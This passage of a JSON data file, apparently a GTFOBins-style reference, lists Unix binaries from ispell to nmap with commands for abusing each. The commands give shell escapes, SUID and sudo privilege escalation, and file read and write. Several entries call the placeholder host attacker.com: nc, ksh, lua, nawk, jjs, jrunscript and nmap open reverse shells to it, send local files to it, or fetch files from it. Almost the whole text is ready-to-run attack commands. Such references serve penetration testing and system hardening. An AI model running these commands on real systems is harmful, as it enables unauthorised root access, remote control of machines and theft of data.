        "Sudo": {
            "code": [
                "sudo irb",
                "exec '/bin/bash'"
            ]
        }
    },
    "ispell": {
        "Shell": {
            "code": [
                "ispell /etc/passwd",
                "!/bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ispell) .",
                "",
                "./ispell /etc/passwd",
                "!/bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ispell /etc/passwd",
                "!/bin/sh"
            ]
        }
    },
    "jjs": {
        "Shell": {
            "code": [
                "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "echo 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");",
                "var port=Java.type(\"java.lang.System\").getenv(\"RPORT\");",
                "var ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");",
                "var p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();",
                "var Socket = Java.type(\"java.net.Socket\");",
                "var s=new Socket(host,port);",
                "var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();",
                "var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "echo \"var URL = Java.type('java.net.URL');",
                "var ws = new URL('$URL');",
                "var Channels = Java.type('java.nio.channels.Channels');",
                "var rbc = Channels.newChannel(ws.openStream());",
                "var FileOutputStream = Java.type('java.io.FileOutputStream');",
                "var fos = new FileOutputStream('$LFILE');",
                "fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);",
                "fos.close();",
                "rbc.close();\" | jjs"
            ]
        },
        "File write": {
            "code": [
                "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");",
                "var fw=new FileWriter(\"./file_to_write\");",
                "fw.write(\"DATA\");",
                "fw.close();' | jjs"
            ]
        },
        "File read": {
            "code": [
                "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");",
                "var FileReader = Java.type(\"java.io.FileReader\");",
                "var br = new BufferedReader(new FileReader(\"file_to_read\"));",
                "while ((line = br.readLine()) != null) { print(line); }' | jjs"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which jjs) .",
                "",
                "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
            ]
        },
        "Sudo": {
            "code": [
                "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
            ]
        }
    },
    "join": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "join -a 2 /dev/null $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which join) .",
                "",
                "LFILE=file_to_read",
                "join -a 2 /dev/null $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo join -a 2 /dev/null $LFILE"
            ]
        }
    },
    "journalctl": {
        "Shell": {
            "code": [
                "journalctl",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo journalctl",
                "!/bin/sh"
            ]
        }
    },
    "jq": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "jq -Rr . \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which jq) .",
                "",
                "LFILE=file_to_read",
                "./jq -Rr . \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo jq -Rr . \"$LFILE\""
            ]
        }
    },
    "jrunscript": {
        "Shell": {
            "code": [
                "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "jrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';",
                "var p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();",
                "var s=new java.net.Socket(host,port);",
                "var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();",
                "var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){",
                "while(pi.available()>0)so.write(pi.read());",
                "while(pe.available()>0)so.write(pe.read());",
                "while(si.available()>0)po.write(si.read());",
                "so.flush();po.flush();",
                "java.lang.Thread.sleep(50);",
                "try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
            ]
        },
        "File download": {
            "code": [
                "URL=http://attacker.com/file_to_get",
                "LFILE=file_to_save",
                "jrunscript -e \"cp('$URL','$LFILE')\""
            ]
        },
        "File write": {
            "code": [
                "jrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'"
            ]
        },
        "File read": {
            "code": [
                "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which jrunscript) .",
                "",
                "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
            ]
        }
    },
    "knife": {
        "Shell": {
            "code": [
                "knife exec -E 'exec \"/bin/sh\"'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo knife exec -E 'exec \"/bin/sh\"'"
            ]
        }
    },
    "ksh": {
        "Shell": {
            "code": [
                "ksh"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'"
            ]
        },
        "File upload": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "export LFILE=file_to_send",
                "ksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'"
            ]
        },
        "File download": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "export LFILE=file_to_get",
                "ksh -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\",
                "    3<>/dev/tcp/$RHOST/$RPORT \\",
                "    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'"
            ]
        },
        "File write": {
            "code": [
                "export LFILE=file_to_write",
                "ksh -c 'echo DATA > $LFILE'"
            ]
        },
        "File read": {
            "code": [
                "export LFILE=file_to_read",
                "ksh -c 'echo \"$(<$LFILE)\"'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ksh) .",
                "",
                "./ksh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ksh"
            ]
        }
    },
    "ksshell": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "ksshell -i $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ksshell) .",
                "",
                "LFILE=file_to_read",
                "./ksshell -i $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo ksshell -i $LFILE"
            ]
        }
    },
    "latex": {
        "Shell": {
            "code": [
                "latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
            ]
        },
        "File read": {
            "code": [
                "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'",
                "strings article.dvi"
            ]
        },
        "Sudo": {
            "code": [
                "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'",
                "strings article.dvi"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which latex) .",
                "",
                "./latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
            ]
        }
    },
    "ld.so": {
        "Shell": {
            "code": [
                "/lib/ld.so /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ld.so) .",
                "",
                "./ld.so /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo /lib/ld.so /bin/sh"
            ]
        }
    },
    "ldconfig": {
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo \"$TF\" > \"$TF/conf\"",
                "# move malicious libraries in $TF",
                "sudo ldconfig -f \"$TF/conf\""
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which ldconfig) .",
                "",
                "TF=$(mktemp -d)",
                "echo \"$TF\" > \"$TF/conf\"",
                "# move malicious libraries in $TF",
                "./ldconfig -f \"$TF/conf\""
            ]
        }
    },
    "less": {
        "Shell": {
            "code": [
                "less /etc/profile",
                "!/bin/sh"
            ]
        },
        "File write": {
            "code": [
                "echo DATA | less",
                "sfile_to_write",
                "q"
            ]
        },
        "File read": {
            "code": [
                "less file_to_read"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which less) .",
                "",
                "./less file_to_read"
            ]
        },
        "Sudo": {
            "code": [
                "sudo less /etc/profile",
                "!/bin/sh"
            ]
        }
    },
    "lftp": {
        "Shell": {
            "code": [
                "lftp -c '!/bin/sh'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo lftp -c '!/bin/sh'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which lftp) .",
                "",
                "./lftp -c '!/bin/sh'"
            ]
        }
    },
    "ln": {
        "Sudo": {
            "code": [
                "sudo ln -fs /bin/sh /bin/ln",
                "sudo ln"
            ]
        }
    },
    "loginctl": {
        "Shell": {
            "code": [
                "loginctl user-status",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo loginctl user-status",
                "!/bin/sh"
            ]
        }
    },
    "logsave": {
        "Shell": {
            "code": [
                "logsave /dev/null /bin/sh -i"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which logsave) .",
                "",
                "./logsave /dev/null /bin/sh -i -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo logsave /dev/null /bin/sh -i"
            ]
        }
    },
    "look": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "look '' \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which look) .",
                "",
                "LFILE=file_to_read",
                "./look '' \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo look '' \"$LFILE\""
            ]
        }
    },
    "ltrace": {
        "Shell": {
            "code": [
                "ltrace -b -L /bin/sh"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "ltrace -s 999 -o $LFILE ltrace -F DATA"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "ltrace -F $LFILE /dev/null"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ltrace -b -L /bin/sh"
            ]
        }
    },
    "lua": {
        "Shell": {
            "code": [
                "lua -e 'os.execute(\"/bin/sh\")'"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "lua -e 'local s=require(\"socket\");",
                "  local t=assert(s.tcp());",
                "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
                "  while true do",
                "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));t:send(b);",
                "  end;",
                "  f:close();t:close();'"
            ]
        },
        "Non-interactive bind shell": {
            "code": [
                "export LPORT=12345",
                "lua -e 'local k=require(\"socket\");",
                "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
                "  local c=s:accept();",
                "  while true do",
                "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));c:send(b);",
                "  end;c:close();f:close();'"
            ]
        },
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_to_send",
                "lua -e '",
                "  local f=io.open(os.getenv(\"LFILE\"), 'rb')",
                "  local d=f:read(\"*a\")",
                "  io.close(f);",
                "  local s=require(\"socket\");",
                "  local t=assert(s.tcp());",
                "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
                "  t:send(d);",
                "  t:close();'"
            ]
        },
        "File download": {
            "code": [
                "export LPORT=12345",
                "export LFILE=file_to_save",
                "lua -e 'local k=require(\"socket\");",
                "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
                "  local c=s:accept();",
                "  local d,x=c:receive(\"*a\");",
                "  c:close();",
                "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
                "  f:write(d);",
                "  io.close(f);'"
            ]
        },
        "File write": {
            "code": [
                "lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'"
            ]
        },
        "File read": {
            "code": [
                "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which lua) .",
                "",
                "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo lua -e 'os.execute(\"/bin/sh\")'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which lua) .",
                "",
                "./lua -e 'os.execute(\"/bin/sh\")'"
            ]
        }
    },
    "lualatex": {
        "Shell": {
            "code": [
                "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which lualatex) .",
                "",
                "./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
            ]
        }
    },
    "luatex": {
        "Shell": {
            "code": [
                "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which luatex) .",
                "",
                "./luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
            ]
        }
    },
    "lwp-download": {
        "File download": {
            "code": [
                "URL=http://attacker.com/file_to_get",
                "LFILE=file_to_save",
                "lwp-download $URL $LFILE"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "TF=$(mktemp)",
                "echo DATA >$TF",
                "lwp-download file://$TF $LFILE"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "TF=$(mktemp)",
                "lwp-download \"file://$LFILE\" $TF",
                "cat $TF"
            ]
        },
        "Sudo": {
            "code": [
                "URL=http://attacker.com/file_to_get",
                "LFILE=file_to_save",
                "sudo lwp-download $URL $LFILE"
            ]
        }
    },
    "lwp-request": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "lwp-request \"file://$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo lwp-request \"file://$LFILE\""
            ]
        }
    },
    "mail": {
        "Shell": {
            "code": [
                "mail --exec='!/bin/sh'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo mail --exec='!/bin/sh'"
            ]
        }
    },
    "make": {
        "Shell": {
            "code": [
                "COMMAND='/bin/sh'",
                "make -s --eval=$'x:\\n\\t-'\"$COMMAND\""
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "make -s --eval=\"\\$(file >$LFILE,DATA)\" ."
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which make) .",
                "",
                "COMMAND='/bin/sh -p'",
                "./make -s --eval=$'x:\\n\\t-'\"$COMMAND\""
            ]
        },
        "Sudo": {
            "code": [
                "COMMAND='/bin/sh'",
                "sudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\""
            ]
        }
    },
    "man": {
        "Shell": {
            "code": [
                "man man",
                "!/bin/sh"
            ]
        },
        "File read": {
            "code": [
                "man file_to_read"
            ]
        },
        "Sudo": {
            "code": [
                "sudo man man",
                "!/bin/sh"
            ]
        }
    },
    "mawk": {
        "Shell": {
            "code": [
                "mawk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "mawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "mawk '//' \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which mawk) .",
                "",
                "LFILE=file_to_read",
                "./mawk '//' \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which mawk) .",
                "",
                "./mawk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        }
    },
    "more": {
        "Shell": {
            "code": [
                "TERM= more /etc/profile",
                "!/bin/sh"
            ]
        },
        "File read": {
            "code": [
                "more file_to_read"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which more) .",
                "",
                "./more file_to_read"
            ]
        },
        "Sudo": {
            "code": [
                "TERM= sudo more /etc/profile",
                "!/bin/sh"
            ]
        }
    },
    "mosquitto": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "mosquitto -c \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which mosquitto) .",
                "",
                "LFILE=file_to_read",
                "./mosquitto -c \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo mosquitto -c \"$LFILE\""
            ]
        }
    },
    "mount": {
        "Sudo": {
            "code": [
                "sudo mount -o bind /bin/sh /bin/mount",
                "sudo mount"
            ]
        }
    },
    "msgattrib": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "msgattrib -P $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which msgattrib) .",
                "",
                "LFILE=file_to_read",
                "./msgattrib -P $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo msgattrib -P $LFILE"
            ]
        }
    },
    "msgcat": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "msgcat -P $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which msgcat) .",
                "",
                "LFILE=file_to_read",
                "./msgcat -P $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo msgcat -P $LFILE"
            ]
        }
    },
    "msgconv": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "msgconv -P $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which msgconv) .",
                "",
                "LFILE=file_to_read",
                "./msgconv -P $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo msgconv -P $LFILE"
            ]
        }
    },
    "msgfilter": {
        "Shell": {
            "code": [
                "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "msgfilter -P -i \"LFILE\" /bin/cat"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which msgfilter) .",
                "",
                "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'"
            ]
        },
        "Sudo": {
            "code": [
                "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"
            ]
        }
    },
    "msgmerge": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "msgmerge -P $LFILE /dev/null"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which msgmerge) .",
                "",
                "LFILE=file_to_read",
                "./msgmerge -P $LFILE /dev/null"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo msgmerge -P $LFILE /dev/null"
            ]
        }
    },
    "msguniq": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "msguniq -P $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which msguniq) .",
                "",
                "LFILE=file_to_read",
                "./msguniq -P $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo msguniq -P $LFILE"
            ]
        }
    },
    "mtr": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "mtr --raw -F \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo mtr --raw -F \"$LFILE\""
            ]
        }
    },
    "mv": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which mv) .",
                "",
                "LFILE=file_to_write",
                "TF=$(mktemp)",
                "echo \"DATA\" > $TF",
                "./mv $TF $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_write",
                "TF=$(mktemp)",
                "echo \"DATA\" > $TF",
                "sudo mv $TF $LFILE"
            ]
        }
    },
    "mysql": {
        "Shell": {
            "code": [
                "mysql -e '\\! /bin/sh'"
            ]
        },
        "Library load": {
            "code": [
                "mysql --default-auth ../../../../../path/to/lib"
            ]
        },
        "Sudo": {
            "code": [
                "sudo mysql -e '\\! /bin/sh'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which mysql) .",
                "",
                "./mysql -e '\\! /bin/sh'"
            ]
        }
    },
    "nano": {
        "Shell": {
            "code": [
                "nano",
                "^R^X",
                "reset; sh 1>&0 2>&0"
            ]
        },
        "File write": {
            "code": [
                "nano file_to_write",
                "DATA",
                "^O"
            ]
        },
        "File read": {
            "code": [
                "nano file_to_read"
            ]
        },
        "Sudo": {
            "code": [
                "sudo nano",
                "^R^X",
                "reset; sh 1>&0 2>&0"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which nano) .",
                "",
                "./nano -s /bin/sh",
                "/bin/sh",
                "^T"
            ]
        }
    },
    "nasm": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "nasm -@ $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which nasm) .",
                "",
                "LFILE=file_to_read",
                "./nasm -@ $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo nasm -@ $LFILE"
            ]
        }
    },
    "nawk": {
        "Shell": {
            "code": [
                "nawk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {",
                "    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;",
                "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
                "    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
            ]
        },
        "Non-interactive bind shell": {
            "code": [
                "LPORT=12345",
                "nawk -v LPORT=$LPORT 'BEGIN {",
                "    s = \"/inet/tcp/\" LPORT \"/0/0\";",
                "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
                "    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "nawk '//' \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which nawk) .",
                "",
                "LFILE=file_to_read",
                "./nawk '//' \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which nawk) .",
                "",
                "./nawk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        }
    },
    "nc": {
        "Reverse shell": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "nc -e /bin/sh $RHOST $RPORT"
            ]
        },
        "Bind shell": {
            "code": [
                "LPORT=12345",
                "nc -l -p $LPORT -e /bin/sh"
            ]
        },
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_to_send",
                "nc $RHOST $RPORT < \"$LFILE\""
            ]
        },
        "File download": {
            "code": [
                "LPORT=12345",
                "LFILE=file_to_save",
                "nc -l -p $LPORT > \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "sudo nc -e /bin/sh $RHOST $RPORT"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which nc) .",
                "",
                "RHOST=attacker.com",
                "RPORT=12345",
                "./nc -e /bin/sh $RHOST $RPORT"
            ]
        }
    },
    "neofetch": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "neofetch --ascii $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo neofetch --ascii $LFILE"
            ]
        }
    },
    "nice": {
        "Shell": {
            "code": [
                "nice /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which nice) .",
                "",
                "./nice /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo nice /bin/sh"
            ]
        }
    },
    "nl": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "nl -bn -w1 -s '' $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which nl) .",
                "",
                "LFILE=file_to_read",
                "./nl -bn -w1 -s '' $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo nl -bn -w1 -s '' $LFILE"
            ]
        }
    },
    "nm": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "nm @$LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which nm) .",
                "",
                "LFILE=file_to_read",
                "./nm @$LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo nm @$LFILE"
            ]
        }
    },
    "nmap": {
        "Shell": {
            "code": [
                "TF=$(mktemp)",
                "echo 'os.execute(\"/bin/sh\")' > $TF",
                "nmap --script=$TF"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "TF=$(mktemp)",
                "echo 'local s=require(\"socket\");",
                "local t=assert(s.tcp());",
                "t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
                "while true do",
                "  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
                "  local b=assert(f:read(\"*a\"));t:send(b);",
                "end;",
                "f:close();t:close();' > $TF",
                "nmap --script=$TF"
            ]
        },
        "Non-interactive bind shell": {
            "code": [
                "export LPORT=12345",
                "TF=$(mktemp)",
                "echo 'local k=require(\"socket\");",
                "local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
                "local c=s:accept();",
                "while true do",
                "  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
                "  local b=assert(f:read(\"*a\"));c:send(b);",
                "end;c:close();f:close();' > $TF",
                "nmap --script=$TF"
            ]
        },
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=8080",
                "LFILE=file_to_send",
                "nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE"
            ]
        },
        "File download": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=8080",
                "TF=$(mktemp -d)",
                "LFILE=file_to_save",
                "nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE"
            ]
        },
        "File write": {
            "code": [
                "TF=$(mktemp)",
                "echo 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF",
                "nmap --script=$TF"
            ]
        },
        "File read": {
            "code": [
                "TF=$(mktemp)",
                "echo 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF",
                "nmap --script=$TF"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which nmap) .",
                "",
                "LFILE=file_to_write",
                "./nmap -oG=$LFILE DATA"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp)",
                "echo 'os.execute(\"/bin/sh\")' > $TF",
                "sudo nmap --script=$TF"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which nmap) .",
                "",
                "TF=$(mktemp)",
                "echo 'os.execute(\"/bin/sh\")' > $TF",
                "./nmap --script=$TF"
            ]
        }
    },
    "node": {
        "Shell": {
            "code": [
